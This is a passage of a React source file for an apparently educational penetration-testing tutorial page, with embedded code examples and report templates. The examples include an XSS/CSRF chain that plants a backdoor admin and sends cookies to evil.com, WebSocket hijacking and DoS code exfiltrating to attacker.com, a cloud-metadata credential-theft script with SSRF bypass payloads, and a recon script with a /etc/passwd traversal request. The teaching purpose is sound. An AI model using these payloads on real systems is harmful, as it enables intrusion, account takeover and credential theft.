    def test_quantity_manipulation(self, product_id):
        """Test for quantity manipulation vulnerabilities"""
        print(f"Testing quantity manipulation for product {product_id}")
        
        test_quantities = [-1, 0, 999999, 2147483647, -2147483648]  # Include integer overflow values
        
        for quantity in test_quantities:
            payload = {
                'product_id': product_id,
                'quantity': quantity
            }
            
            try:
                response = requests.post(
                    f"{self.base_url}/cart/add",
                    json=payload,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    print(f"  [+] Quantity {quantity}: Accepted")
                    
                    # Check if this affects total price calculation
                    cart_response = requests.get(
                        f"{self.base_url}/cart",
                        headers=self.headers
                    )
                    
                    if cart_response.status_code == 200:
                        cart_data = cart_response.json()
                        total = cart_data.get('total', 0)
                        print(f"    Cart total: {total}")
                        
                        if quantity < 0 and total < 0:
                            print("    [!] Negative total detected!")
                else:
                    print(f"  [-] Quantity {quantity}: Rejected ({response.status_code})")
                    
            except Exception as e:
                print(f"  [!] Error testing quantity {quantity}: {e}")
    
    def test_workflow_bypass(self, workflow_steps):
        """Test for workflow bypass vulnerabilities"""
        print("Testing workflow bypass")
        
        # Try to skip steps in the workflow
        for i, step in enumerate(workflow_steps):
            print(f"  Testing skip to step {i+1}: {step['name']}")
            
            try:
                response = requests.post(
                    f"{self.base_url}{step['endpoint']}",
                    json=step.get('payload', {}),
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    print(f"    [+] Step {i+1} accessible without prerequisites")
                else:
                    print(f"    [-] Step {i+1} properly protected ({response.status_code})")
                    
            except Exception as e:
                print(f"    [!] Error testing step {i+1}: {e}")

# Usage example
tester = BusinessLogicTester("https://example.com", "your_jwt_token_here")

# Test race condition on account balance update
race_payload = {'amount': 100, 'account_id': 12345}
tester.test_race_condition("/api/transfer", race_payload)

# Test price manipulation
tester.test_price_manipulation(product_id=1, original_price=99.99)

# Test quantity manipulation
tester.test_quantity_manipulation(product_id=1)

# Test workflow bypass
workflow = [
    {'name': 'Add to cart', 'endpoint': '/api/cart/add', 'payload': {'product_id': 1}},
    {'name': 'Checkout', 'endpoint': '/api/checkout', 'payload': {}},
    {'name': 'Payment', 'endpoint': '/api/payment', 'payload': {'method': 'credit_card'}},
    {'name': 'Confirmation', 'endpoint': '/api/order/confirm', 'payload': {}}
]
tester.test_workflow_bypass(workflow)`}
              />
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Advanced Exploitation Techniques */}
        <AccordionItem value="advanced-exploitation" className="border border-cybr-muted/30 rounded-lg px-6">
          <AccordionTrigger className="hover:no-underline">
            <div className="flex items-center gap-3">
              <Zap className="h-6 w-6 text-cybr-primary" />
              <span className="text-xl font-semibold">Advanced Exploitation Techniques</span>
            </div>
          </AccordionTrigger>
          <AccordionContent className="pt-6 space-y-6">
            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Chaining Vulnerabilities</h4>
              <p className="mb-4">
                Advanced exploitation often involves chaining multiple vulnerabilities to achieve 
                maximum impact. Understanding how vulnerabilities can be combined is crucial for 
                demonstrating real-world attack scenarios.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Common Vulnerability Chains</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>CSRF + Stored XSS:</strong> Cross-site request to inject payload</li>
                    <li><strong>IDOR + Privilege Escalation:</strong> Access control bypass to admin</li>
                    <li><strong>XXE + SSRF:</strong> XML parsing to internal network access</li>
                    <li><strong>File Upload + LFI:</strong> Malicious upload to inclusion</li>
                    <li><strong>SQL Injection + File Write:</strong> Database to web shell</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Advanced Combinations</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Subdomain Takeover + Cookie Theft:</strong> Domain control</li>
                    <li><strong>Open Redirect + OAuth Bypass:</strong> Authentication bypass</li>
                    <li><strong>SSRF + Cloud Metadata:</strong> Credential theft</li>
                    <li><strong>Deserialization + RCE:</strong> Object manipulation</li>
                    <li><strong>Cache Poisoning + XSS:</strong> Widespread payload delivery</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="javascript"
                title="XSS + CSRF Chain Exploitation"
                code={`// Advanced XSS payload that performs CSRF to create admin user
// This payload would be injected via stored XSS vulnerability

// Stage 1: Gather CSRF token
function stealCSRFToken() {
    return new Promise((resolve, reject) => {
        fetch('/admin/users/new', {
            method: 'GET',
            credentials: 'include'
        })
        .then(response => response.text())
        .then(html => {
            // Extract CSRF token from HTML
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
            resolve(csrfToken);
        })
        .catch(reject);
    });
}

// Stage 2: Create malicious admin user
function createAdminUser(csrfToken) {
    const formData = new FormData();
    formData.append('username', 'backdoor_admin');
    formData.append('password', 'complex_password_123!');
    formData.append('email', 'backdoor@evil.com');
    formData.append('role', 'administrator');
    formData.append('csrf_token', csrfToken);
    
    return fetch('/admin/users/create', {
        method: 'POST',
        body: formData,
        credentials: 'include'
    });
}

// Stage 3: Exfiltrate confirmation and session data
function exfiltrateData(result) {
    const data = {
        success: result.status === 200,
        cookies: document.cookie,
        timestamp: new Date().toISOString(),
        location: window.location.href
    };
    
    // Send to attacker-controlled server
    navigator.sendBeacon('https://evil.com/collect', JSON.stringify(data));
}

// Execute the attack chain
(async function() {
    try {
        const csrfToken = await stealCSRFToken();
        const result = await createAdminUser(csrfToken);
        exfiltrateData(result);
    } catch (error) {
        // Silently fail to avoid detection
        console.log('Legitimate user interaction');
    }
})();

// Alternative payload using XMLHttpRequest for broader compatibility
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', '/admin/users/new', true);
xhr1.withCredentials = true;
xhr1.onreadystatechange = function() {
    if (xhr1.readyState === 4 && xhr1.status === 200) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(xhr1.responseText, 'text/html');
        var token = doc.querySelector('input[name="csrf_token"]').value;
        
        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', '/admin/users/create', true);
        xhr2.withCredentials = true;
        xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        
        var payload = 'username=evil_admin&password=Password123!&email=evil@attacker.com&role=admin&csrf_token=' + encodeURIComponent(token);
        xhr2.send(payload);
    }
};
xhr1.send();`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Modern Web Exploitation</h4>
              <p className="mb-4">
                Modern web applications use advanced technologies that introduce new attack vectors. 
                Understanding these technologies and their security implications is essential.
              </p>

              <div className="grid md:grid-cols-3 gap-4 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">WebAssembly (WASM)</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Memory corruption</li>
                    <li>Sandbox escape</li>
                    <li>JavaScript interop</li>
                    <li>Reverse engineering</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Progressive Web Apps</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Service Worker abuse</li>
                    <li>Cache poisoning</li>
                    <li>Offline exploitation</li>
                    <li>Push notification abuse</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">WebSocket Security</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Connection hijacking</li>
                    <li>Message injection</li>
                    <li>CSRF in WebSockets</li>
                    <li>DoS attacks</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="javascript"
                title="WebSocket Exploitation Example"
                code={`// WebSocket Connection Hijacking and Message Injection
// This demonstrates how to exploit WebSocket vulnerabilities

// 1. WebSocket CSRF (Cross-Site WebSocket Hijacking)
function websocketCSRF() {
    // Connect to target WebSocket without proper origin validation
    const ws = new WebSocket('wss://target.com/api/websocket');
    
    ws.onopen = function() {
        console.log('WebSocket connection established');
        
        // Send malicious commands once connected
        const maliciousCommands = [
            '{"action": "delete_user", "user_id": "admin"}',
            '{"action": "transfer_funds", "amount": 10000, "to_account": "attacker"}',
            '{"action": "change_password", "user": "admin", "new_password": "hacked123"}'
        ];
        
        maliciousCommands.forEach((cmd, index) => {
            setTimeout(() => {
                ws.send(cmd);
                console.log('Sent malicious command:', cmd);
            }, index * 1000);
        });
    };
    
    ws.onmessage = function(event) {
        console.log('Received response:', event.data);
        
        // Exfiltrate sensitive data
        if (event.data.includes('sensitive') || event.data.includes('password')) {
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'websocket_data',
                    data: event.data,
                    timestamp: Date.now()
                })
            });
        }
    };
    
    ws.onerror = function(error) {
        console.log('WebSocket error:', error);
    };
}

// 2. WebSocket Message Injection
function websocketInjection() {
    const ws = new WebSocket('wss://target.com/chat');
    
    ws.onopen = function() {
        // Inject malicious messages that could be interpreted as commands
        const injectionPayloads = [
            // Command injection in chat messages
            '{"type": "message", "content": "/admin delete_all_users"}',
            
            // JSON injection to manipulate message structure
            '{"type": "message", "content": "hello", "admin": true, "permissions": ["all"]}',
            
            // Script injection for other connected clients
            '{"type": "message", "content": "<script>alert(\\'XSS via WebSocket\\')</script>"}',
            
            // Protocol manipulation
            '{"type": "admin_command", "action": "shutdown_server"}',
            
            // Buffer overflow attempt (if backend is vulnerable)
            '{"type": "message", "content": "' + 'A'.repeat(10000) + '"}'
        ];
        
        injectionPayloads.forEach((payload, index) => {
            setTimeout(() => {
                ws.send(payload);
            }, index * 500);
        });
    };
}

// 3. WebSocket DoS Attack
function websocketDoS() {
    const connections = [];
    const maxConnections = 1000;
    
    // Create multiple connections to exhaust server resources
    for (let i = 0; i < maxConnections; i++) {
        try {
            const ws = new WebSocket('wss://target.com/api/websocket');
            connections.push(ws);
            
            ws.onopen = function() {
                // Send continuous messages to consume bandwidth
                setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send('{"type": "ping", "data": "' + 'x'.repeat(1000) + '"}');
                    }
                }, 10);
            };
        } catch (error) {
            console.log('Connection failed:', error);
        }
    }
    
    console.log(\`Created \${connections.length} WebSocket connections\`);
}

// 4. WebSocket Reconnaissance
function websocketRecon(target) {
    const commonPaths = [
        '/websocket',
        '/api/websocket',
        '/socket.io/',
        '/ws',
        '/chat',
        '/api/ws',
        '/realtime',
        '/live'
    ];
    
    const protocols = ['ws:', 'wss:'];
    
    protocols.forEach(protocol => {
        commonPaths.forEach(path => {
            const url = \`\${protocol}//\${target}\${path}\`;
            
            try {
                const ws = new WebSocket(url);
                
                ws.onopen = function() {
                    console.log(\`WebSocket found: \${url}\`);
                    
                    // Test for authentication bypass
                    ws.send('{"action": "authenticate", "token": ""}');
                    ws.send('{"action": "get_users"}');
                    ws.send('{"action": "admin_status"}');
                    
                    setTimeout(() => ws.close(), 2000);
                };
                
                ws.onerror = function() {
                    // Silently ignore connection errors
                };
                
            } catch (error) {
                // Ignore invalid URLs
            }
        });
    });
}

// Usage examples (for educational/authorized testing only)
// websocketCSRF();
// websocketInjection();
// websocketRecon('target.com');`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Cloud and Serverless Exploitation</h4>
              <p className="mb-4">
                Cloud-native applications and serverless architectures introduce unique security challenges. 
                Understanding cloud-specific attack vectors is crucial for modern penetration testing.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Cloud-Specific Attacks</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Metadata Service Abuse:</strong> AWS/Azure/GCP credential theft</li>
                    <li><strong>IAM Privilege Escalation:</strong> Role assumption attacks</li>
                    <li><strong>Storage Bucket Misconfiguration:</strong> S3/Blob exposure</li>
                    <li><strong>Container Escape:</strong> Breaking out of containers</li>
                    <li><strong>Serverless Function Abuse:</strong> Lambda/Function exploitation</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Serverless Vulnerabilities</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Cold Start Exploitation:</strong> Initialization vulnerabilities</li>
                    <li><strong>Function Enumeration:</strong> Discovering hidden functions</li>
                    <li><strong>Environment Variable Exposure:</strong> Secret leakage</li>
                    <li><strong>Dependency Vulnerabilities:</strong> Third-party package risks</li>
                    <li><strong>Event Injection:</strong> Malicious event payloads</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="Cloud Metadata Exploitation"
                code={`#!/bin/bash
# Cloud Metadata Service Exploitation Script
# For authorized testing only

# AWS Metadata Service Exploitation
function exploit_aws_metadata() {
    echo "[+] Testing AWS Metadata Service Access"
    
    # Check if metadata service is accessible
    if curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ > /dev/null; then
        echo "[+] AWS Metadata service accessible!"
        
        # Enumerate available metadata
        echo "[*] Available metadata:"
        curl -s http://169.254.169.254/latest/meta-data/
        
        # Get instance identity
        echo -e "\n[*] Instance identity:"
        curl -s http://169.254.169.254/latest/dynamic/instance-identity/document
        
        # Enumerate IAM roles
        echo -e "\n[*] IAM roles:"
        roles=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
        echo "$roles"
        
        # Extract credentials for each role
        for role in $roles; do
            echo -e "\n[*] Credentials for role $role:"
            curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
        done
        
        # Get user data (often contains secrets)
        echo -e "\n[*] User data:"
        curl -s http://169.254.169.254/latest/user-data/
        
    else
        echo "[-] AWS Metadata service not accessible"
    fi
}

# Azure Metadata Service Exploitation
function exploit_azure_metadata() {
    echo "[+] Testing Azure Metadata Service Access"
    
    # Azure requires Metadata header
    if curl -s --max-time 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > /dev/null; then
        echo "[+] Azure Metadata service accessible!"
        
        # Get instance metadata
        echo "[*] Instance metadata:"
        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .
        
        # Get access token
        echo -e "\n[*] Attempting to get access token:"
        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .
        
        # Get storage account access token
        echo -e "\n[*] Storage account access token:"
        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | jq .
        
    else
        echo "[-] Azure Metadata service not accessible"
    fi
}

# Google Cloud Metadata Exploitation
function exploit_gcp_metadata() {
    echo "[+] Testing GCP Metadata Service Access"
    
    # GCP requires specific header
    if curl -s --max-time 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" > /dev/null; then
        echo "[+] GCP Metadata service accessible!"
        
        # Get project info
        echo "[*] Project ID:"
        curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"
        
        # Get service accounts
        echo -e "\n[*] Service accounts:"
        curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
        
        # Get default service account token
        echo -e "\n[*] Default service account token:"
        curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        
        # Get SSH keys
        echo -e "\n[*] SSH keys:"
        curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
        
    else
        echo "[-] GCP Metadata service not accessible"
    fi
}

# Container Escape Detection
function detect_container_escape() {
    echo "[+] Checking for container escape possibilities"
    
    # Check if running in container
    if [[ -f /.dockerenv ]] || grep -q docker /proc/1/cgroup 2>/dev/null; then
        echo "[*] Running inside container"
        
        # Check for privileged container
        if [[ $(id -u) -eq 0 ]]; then
            echo "[*] Running as root - checking for escape vectors"
            
            # Check for host filesystem mounts
            echo "[*] Host filesystem mounts:"
            mount | grep -E "(proc|sys|dev)" | head -10
            
            # Check for Docker socket
            if [[ -S /var/run/docker.sock ]]; then
                echo "[!] Docker socket accessible - container escape possible!"
                docker ps 2>/dev/null && echo "[!] Can list containers!"
            fi
            
            # Check capabilities
            echo "[*] Container capabilities:"
            capsh --print | grep Current
            
            # Check for host network access
            if ip route | grep -q "169.254.169.254"; then
                echo "[!] Can access metadata service from container!"
            fi
        fi
    else
        echo "[-] Not running in container"
    fi
}

# SSRF to Metadata Exploitation
function ssrf_metadata_payloads() {
    echo "[+] SSRF Payloads for Metadata Access"
    
    cat << 'EOF'
# AWS Metadata SSRF Payloads:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://[::ffff:169.254.169.254]/latest/meta-data/
http://0251.0376.0251.0376/latest/meta-data/
http://2852039166/latest/meta-data/

# Azure Metadata SSRF Payloads (with required header):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# GCP Metadata SSRF Payloads (with required header):
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Bypass techniques:
# URL encoding: http%3A//169.254.169.254/
# DNS rebinding: http://169.254.169.254.nip.io/
# Decimal IP: http://2852039166/
# Octal IP: http://0251.0376.0251.0376/
# IPv6: http://[::ffff:169.254.169.254]/
# DNS redirect: http://metadata.attacker.com/ (redirects to 169.254.169.254)
EOF
}

# Main execution
echo "=== Cloud Metadata Exploitation Tool ==="
echo "For authorized penetration testing only"
echo ""

exploit_aws_metadata
echo ""
exploit_azure_metadata
echo ""
exploit_gcp_metadata
echo ""
detect_container_escape
echo ""
ssrf_metadata_payloads`}
              />
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Professional Methodologies and Frameworks */}
        <AccordionItem value="professional-methodologies" className="border border-cybr-muted/30 rounded-lg px-6">
          <AccordionTrigger className="hover:no-underline">
            <div className="flex items-center gap-3">
              <Lock className="h-6 w-6 text-cybr-primary" />
              <span className="text-xl font-semibold">Professional Methodologies & Frameworks</span>
            </div>
          </AccordionTrigger>
          <AccordionContent className="pt-6 space-y-6">
            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">OWASP Testing Guide Implementation</h4>
              <p className="mb-4">
                The OWASP Web Security Testing Guide (WSTG) provides a comprehensive framework for 
                conducting web application security assessments. Following this methodology ensures 
                systematic and thorough testing coverage.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Information Gathering (WSTG-INFO)</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Search Engine Discovery</li>
                    <li>Fingerprint Web Server</li>
                    <li>Review Webserver Metafiles</li>
                    <li>Enumerate Applications</li>
                    <li>Review Webpage Content</li>
                    <li>Identify Entry Points</li>
                    <li>Map Execution Paths</li>
                    <li>Fingerprint Framework</li>
                    <li>Map Application Architecture</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Configuration Management (WSTG-CONFIG)</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Network Infrastructure Configuration</li>
                    <li>Application Platform Configuration</li>
                    <li>File Extensions Handling</li>
                    <li>Backup and Unreferenced Files</li>
                    <li>Admin Interfaces</li>
                    <li>HTTP Methods Testing</li>
                    <li>HTTP Strict Transport Security</li>
                    <li>Cross Domain Policy</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="OWASP Testing Automation Script"
                code={`#!/bin/bash
# OWASP WSTG Automated Testing Script
# Implements key tests from the OWASP Web Security Testing Guide

TARGET_URL="$1"
OUTPUT_DIR="owasp_test_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

if [[ -z "$TARGET_URL" ]]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR/$TIMESTAMP"
cd "$OUTPUT_DIR/$TIMESTAMP"

echo "=== OWASP WSTG Testing for $TARGET_URL ==="
echo "Results will be saved in: $OUTPUT_DIR/$TIMESTAMP"

# WSTG-INFO-01: Conduct Search Engine Discovery Reconnaissance
echo "[INFO-01] Search Engine Discovery"
echo "Google Dorking results:" > info_01_search_engine.txt
curl -s "https://www.google.com/search?q=site:$TARGET_URL" >> info_01_search_engine.txt

# WSTG-INFO-02: Fingerprint Web Server
echo "[INFO-02] Web Server Fingerprinting"
whatweb "$TARGET_URL" > info_02_fingerprint.txt 2>&1
nmap --script http-headers,http-methods,http-title "$TARGET_URL" >> info_02_fingerprint.txt 2>&1

# WSTG-INFO-03: Review Webserver Metafiles
echo "[INFO-03] Webserver Metafiles"
{
    echo "=== robots.txt ==="
    curl -s "$TARGET_URL/robots.txt"
    echo -e "\n=== sitemap.xml ==="
    curl -s "$TARGET_URL/sitemap.xml"
    echo -e "\n=== security.txt ==="
    curl -s "$TARGET_URL/.well-known/security.txt"
} > info_03_metafiles.txt

# WSTG-INFO-04: Enumerate Applications on Webserver
echo "[INFO-04] Application Enumeration"
{
    echo "=== Subdomain enumeration ==="
    subfinder -d "$TARGET_URL" -silent 2>/dev/null || echo "subfinder not available"
    
    echo -e "\n=== Virtual host enumeration ==="
    gobuster vhost -u "http://$TARGET_URL" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 2>/dev/null || echo "gobuster not available"
} > info_04_enumeration.txt

# WSTG-INFO-06: Identify Application Entry Points
echo "[INFO-06] Entry Points Identification"
{
    echo "=== Directory enumeration ==="
    gobuster dir -u "$TARGET_URL" -w /usr/share/wordlists/dirb/common.txt -q 2>/dev/null || echo "gobuster not available"
    
    echo -e "\n=== Parameter discovery ==="
    paramspider -d "$TARGET_URL" 2>/dev/null || echo "paramspider not available"
} > info_06_entry_points.txt

# WSTG-CONFIG-02: Test Application Platform Configuration
echo "[CONFIG-02] Platform Configuration"
{
    echo "=== HTTP headers analysis ==="
    curl -I "$TARGET_URL"
    
    echo -e "\n=== Security headers check ==="
    curl -s -D - "$TARGET_URL" | grep -i -E "(x-frame-options|x-xss-protection|x-content-type-options|strict-transport-security|content-security-policy)"
} > config_02_platform.txt

# WSTG-CONFIG-06: Test HTTP Methods
echo "[CONFIG-06] HTTP Methods Testing"
{
    echo "=== Available HTTP methods ==="
    nmap --script http-methods "$TARGET_URL"
    
    echo -e "\n=== OPTIONS request ==="
    curl -X OPTIONS -v "$TARGET_URL" 2>&1 | grep -E "(Allow:|< HTTP)"
} > config_06_methods.txt

# WSTG-ATHN: Authentication Testing
echo "[ATHN] Authentication Testing"
{
    echo "=== Login page discovery ==="
    gobuster dir -u "$TARGET_URL" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -q | grep -i login
    
    echo -e "\n=== Admin panel discovery ==="
    gobuster dir -u "$TARGET_URL" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -q | grep -i admin
} > athn_authentication.txt

# WSTG-SESS: Session Management Testing
echo "[SESS] Session Management Testing"
{
    echo "=== Cookie analysis ==="
    curl -c cookies.txt -b cookies.txt -s "$TARGET_URL" > /dev/null
    if [[ -f cookies.txt ]]; then
        cat cookies.txt
    fi
    
    echo -e "\n=== Session token analysis ==="
    for i in {1..5}; do
        echo "Request $i:"
        curl -c "session_$i.txt" -s "$TARGET_URL" > /dev/null
        if [[ -f "session_$i.txt" ]]; then
            grep -v "^#" "session_$i.txt" | cut -f7
        fi
    done
} > sess_session_mgmt.txt

# WSTG-INPV: Input Validation Testing
echo "[INPV] Input Validation Testing"
{
    echo "=== SQL injection testing with sqlmap ==="
    if command -v sqlmap &> /dev/null; then
        sqlmap -u "$TARGET_URL" --batch --crawl=2 --level=1 --risk=1 --output-dir="sqlmap_results" 2>/dev/null || echo "No SQL injection found or error occurred"
    else
        echo "sqlmap not available"
    fi
    
    echo -e "\n=== XSS testing ==="
    if command -v dalfox &> /dev/null; then
        dalfox url "$TARGET_URL" --only-discovery 2>/dev/null || echo "dalfox error or no XSS found"
    else
        echo "dalfox not available"
    fi
} > inpv_input_validation.txt

# WSTG-ERR: Error Handling
echo "[ERR] Error Handling Testing"
{
    echo "=== 404 error page ==="
    curl -s "$TARGET_URL/nonexistent_page_12345"
    
    echo -e "\n=== Server error generation ==="
    curl -s "$TARGET_URL/../../../etc/passwd"
    curl -s "$TARGET_URL/'\"<>"
} > err_error_handling.txt

# WSTG-CRYP: Cryptography
echo "[CRYP] Cryptography Testing"
{
    echo "=== SSL/TLS configuration ==="
    if command -v testssl.sh &> /dev/null; then
        testssl.sh --quiet --color 0 "$TARGET_URL"
    else
        echo "testssl.sh not available"
        nmap --script ssl-enum-ciphers "$TARGET_URL"
    fi
} > cryp_cryptography.txt

# WSTG-BUSLOGIC: Business Logic Testing
echo "[BUSLOGIC] Business Logic Testing"
{
    echo "=== Application workflow analysis ==="
    echo "Manual testing required for business logic flaws"
    echo "Key areas to test:"
    echo "- Multi-step processes"
    echo "- Price manipulation"
    echo "- Quantity manipulation"
    echo "- Workflow bypass"
    echo "- Race conditions"
} > buslogic_business_logic.txt

# Generate summary report
echo "=== OWASP WSTG Testing Summary ===" > summary_report.txt
echo "Target: $TARGET_URL" >> summary_report.txt
echo "Date: $(date)" >> summary_report.txt
echo "Output Directory: $OUTPUT_DIR/$TIMESTAMP" >> summary_report.txt
echo "" >> summary_report.txt

# Count findings in each category
for file in *.txt; do
    echo "=== $file ===" >> summary_report.txt
    wc -l "$file" >> summary_report.txt
    echo "" >> summary_report.txt
done

echo "Testing completed. Check files in $OUTPUT_DIR/$TIMESTAMP/"
echo "Summary report: $OUTPUT_DIR/$TIMESTAMP/summary_report.txt"`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">PTES (Penetration Testing Execution Standard)</h4>
              <p className="mb-4">
                PTES provides a comprehensive framework for conducting penetration tests, covering 
                the entire lifecycle from pre-engagement to reporting.
              </p>

              <div className="grid md:grid-cols-3 gap-4 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Phase 1-3: Preparation</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Pre-engagement interactions</li>
                    <li>Intelligence gathering</li>
                    <li>Threat modeling</li>
                    <li>Scope definition</li>
                    <li>Rules of engagement</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Phase 4-5: Execution</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Vulnerability analysis</li>
                    <li>Exploitation techniques</li>
                    <li>Post-exploitation activities</li>
                    <li>Privilege escalation</li>
                    <li>Lateral movement</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Phase 6-7: Closure</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Data collection</li>
                    <li>Evidence documentation</li>
                    <li>Risk assessment</li>
                    <li>Report generation</li>
                    <li>Remediation guidance</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Professional Reporting Standards</h4>
              <p className="mb-4">
                Professional penetration testing reports must effectively communicate technical findings 
                to both technical and executive audiences while providing actionable remediation guidance.
              </p>

              <CodeExample
                language="markdown"
                title="Executive Summary Template"
                code={`# Executive Summary

## Assessment Overview
- **Client**: [Company Name]
- **Assessment Period**: [Start Date] - [End Date]
- **Assessment Type**: Web Application Penetration Test
- **Scope**: [Applications/URLs tested]
- **Methodology**: OWASP Testing Guide v4.2, PTES

## Key Findings Summary
- **Critical**: [Number] findings
- **High**: [Number] findings  
- **Medium**: [Number] findings
- **Low**: [Number] findings
- **Informational**: [Number] findings

## Risk Rating Distribution
[Risk matrix visualization or table]

## Business Impact Assessment
### Immediate Risks
- [Critical/High severity issues with direct business impact]
- [Regulatory compliance violations]
- [Data breach potential]

### Compliance Impact
- [PCI DSS, GDPR, HIPAA, SOX requirements]
- [Industry-specific regulations]
- [Audit implications]

### Reputation Risk
- [Public disclosure concerns]
- [Customer trust impact]
- [Competitive disadvantage]

### Financial Impact
- [Potential losses from exploitation]
- [Regulatory fines and penalties]
- [Remediation costs]

## Strategic Recommendations
### Immediate Actions (0-30 days)
1. **Address Critical Vulnerabilities**
   - [Specific critical issues requiring immediate attention]
   - [Temporary mitigations until permanent fixes]

2. **Implement Security Controls**
   - [Essential security measures]
   - [Configuration changes]

### Short-term Improvements (1-6 months)
1. **Security Architecture**
   - [Architectural improvements]
   - [Technology upgrades]

2. **Process Improvements**
   - [Security testing integration]
   - [Incident response procedures]

### Long-term Strategy (6-12 months)
1. **Security Program Enhancement**
   - [Comprehensive security program]
   - [Training and awareness]

2. **Continuous Monitoring**
   - [Ongoing security assessments]
   - [Threat intelligence integration]

## Conclusion
[Overall security posture assessment and key takeaways]

---

# Technical Finding Template

## [Vulnerability Name] - [CRITICAL/HIGH/MEDIUM/LOW]

### Vulnerability Details
- **Vulnerability Type**: [OWASP Top 10 Category/CWE Reference]
- **Affected Components**: [Specific URLs, parameters, or functions]
- **Discovery Method**: [Manual testing/Automated scanning]
- **CVSS v3.1 Score**: [Score] ([Vector String])

### Description
[Detailed technical explanation of the vulnerability, including root cause and exploitation mechanism]

### Technical Impact
- **Confidentiality**: [High/Medium/Low/None]
- **Integrity**: [High/Medium/Low/None]  
- **Availability**: [High/Medium/Low/None]

### Business Impact
[Real-world implications specific to the client's business context]

### Proof of Concept
#### Steps to Reproduce
1. [Detailed step-by-step instructions]
2. [Include specific URLs, parameters, and payloads]
3. [Expected vs actual results]

#### Exploitation Evidence
[Screenshots, HTTP requests/responses, or other supporting evidence]

### Remediation Recommendations
#### Immediate Actions (Quick Fixes)
- [Specific configuration changes]
- [Temporary workarounds]
- [Input validation improvements]

